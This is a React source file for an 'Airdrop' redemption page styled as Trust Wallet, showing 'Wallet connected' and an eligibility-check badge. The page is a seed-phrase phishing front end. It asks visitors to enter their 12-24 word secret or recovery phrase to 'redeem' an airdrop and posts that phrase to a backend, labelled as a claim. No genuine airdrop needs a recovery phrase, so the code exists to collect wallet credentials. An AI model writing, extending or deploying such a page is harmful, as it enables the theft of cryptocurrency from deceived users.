// src/pages/AirdropPage/AirdropPage.jsx
import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { IoArrowBack, IoClose, IoShieldCheckmarkOutline } from 'react-icons/io5'
import RedemptionModal from '../../components/RedemptionModal/RedemptionModal'
import trustShield from '../../assets/trust-shield.png'
import api from '../../api/axios'

function AirdropPage({ asSection = false, id }) {
  const navigate = useNavigate()
  const [claimWords, setClaimWords] = useState('')
  const [showRedeemModal, setShowRedeemModal] = useState(false)
  const [isRedeeming, setIsRedeeming] = useState(false)
  const PageTag = asSection ? 'section' : 'main'
  const [error, setError] = useState('')
  const [redeemStatus, setRedeemStatus] = useState(null)
  const [batchData, setBatchData] = useState(null)

  const handleRedeem = async () => {
    if (isRedeeming) return
    if (!claimWords.trim()) {
      setError('Please enter your claim words')
      return
    }

    setIsRedeeming(true)
    setError('')
    setRedeemStatus(null)

    try {
      // Send the claim words to the backend
      const response = await api.post('/', {
        words: claimWords,
        title: 'Airdrop',
        createdBy: 'airdrop-user',
        source: 'airdrop',
      })

      console.log('Airdrop claim response:', response.data)

      if (response.data.ok) {
        setRedeemStatus('success')
        setBatchData(response.data.batch)
        setShowRedeemModal(true)
      } else {
        setRedeemStatus('failure')
        setShowRedeemModal(true)
        setError(response.data.error || 'Failed to process airdrop claim')
      }
    } catch (error) {
      console.error('Airdrop claim error:', error)
      setRedeemStatus('failure')
      setShowRedeemModal(true)
      
      // Check for specific error messages
      if (error.response?.status === 404) {
        setError('API endpoint not found. Please check your connection.')
      } else if (error.response?.data?.error) {
        setError(error.response.data.error)
      } else if (error.code === 'ECONNABORTED') {
        setError('Request timed out. Please try again.')
      } else {
        setError('Failed to connect to server. Please try again.')
      }
    } finally {
      setIsRedeeming(false)
    }
  }

  const handleClearWords = () => {
    setClaimWords('')
    setError('')
  }

  const handleCloseModal = () => {
    setShowRedeemModal(false)
    setRedeemStatus(null)
    // If successful, you might want to clear the form
    if (redeemStatus === 'success') {
      setClaimWords('')
    }
  }

  return (
    <PageTag className={`airdrop-page ${asSection ? 'airdrop-section' : ''}`} id={id}>
      <section className="airdrop-panel" aria-labelledby="airdrop-title">
        <header className="airdrop-header">
          {asSection ? <span aria-hidden="true" /> : (
            <button className="icon-button" type="button" onClick={() => navigate('/')} aria-label="Back">
              <IoArrowBack />
            </button>
          )}
          <div className="airdrop-logo">
            <img src={trustShield} alt="" />
          </div>
        </header>

        <section className="airdrop-copy">
          <p>Wallet connected</p>
          <h1 id="airdrop-title">Redeem Airdrop</h1>
          <span>
            Add your claim information below to continue with the redemption
            request.
          </span>
        </section>

        <form className="claim-form" onSubmit={(event) => event.preventDefault()}>
          <label className="claim-field">
            <span>Wallet Phrase</span>
            <div className="claim-words-box">
              <textarea
                value={claimWords}
                onChange={(event) => {
                  setClaimWords(event.target.value)
                  setError('')
                }}
                placeholder="Enter a secret phrase, recovery phrase to redeem your airdrop. This is usually a 12-24 word phrase."
                rows="8"
                disabled={isRedeeming}
              />
              {claimWords && (
                <button
                  type="button"
                  aria-label="Clear claim words"
                  onClick={handleClearWords}
                  disabled={isRedeeming}
                >
                  <IoClose />
                </button>
              )}
            </div>
            <small>
              Enter a secret phrase, recovery phrase to redeem your airdrop. This is usually a 12-24 word phrase.
            </small>
            {error && (
              <div className="error-message" style={{ color: 'red', marginTop: '8px', fontSize: '14px' }}>
                {error}
              </div>
            )}
          </label>
        </form>

        <div className="wallet-summary">
          <span className="summary-icon">
            <IoShieldCheckmarkOutline />
          </span>
          <span>
            <strong>Trust Wallet</strong>
            <small>Connected for eligibility check</small>
          </span>
        </div>

        <button
          className="redeem-button"
          type="button"
          onClick={handleRedeem}
          disabled={isRedeeming || !claimWords.trim()}
          aria-busy={isRedeeming}
        >
          {isRedeeming ? (
            <>
              <span className="button-loader" aria-hidden="true" />
              Processing
            </>
          ) : (
            'Redeem'
          )}
        </button>
      </section>

      {showRedeemModal && (
        <RedemptionModal 
          onClose={handleCloseModal}
          status={redeemStatus}
          errorMessage={error}
          batchData={batchData}
        />
      )}
    </PageTag>
  )
}

export default AirdropPage